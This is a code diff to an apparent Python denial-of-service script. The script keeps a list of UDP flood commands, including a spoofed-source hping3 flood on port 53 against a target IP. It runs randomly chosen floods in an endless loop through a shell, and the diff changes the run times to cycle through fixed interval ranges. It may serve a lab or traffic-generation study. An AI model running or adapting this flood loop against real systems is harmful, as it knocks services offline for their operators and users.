@@ -21,16 +21,22 @@ UDP_ATTACKS = [
     # f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP} -d 512",
 ]
 
+i = 0 
 while True:
-    sleep_intervals = [random.randint(5, 15), random.randint(15, 60), random.randint(60, 90)]
-    random_sleep = random.choice(sleep_intervals)
+
+    sleep_intervals = [random.randint(5, 15), random.randint(15, 30), random.randint(35, 60)]
     random_index = random.randint(0, len(UDP_ATTACKS) - 1)
 
-    print(f"Executing: {UDP_ATTACKS[random_index]} for {random_sleep} seconds...")
+    print(f"Executing: {UDP_ATTACKS[random_index]} for {sleep_intervals[i]} seconds...")
 
     process = subprocess.Popen(UDP_ATTACKS[random_index], shell=True)
     
-    time.sleep(random_sleep)
+    time.sleep(sleep_intervals[i])
+    i += 1
+
+    if i == 3:
+        i = 0
+
     process.terminate()
     process.wait()
     
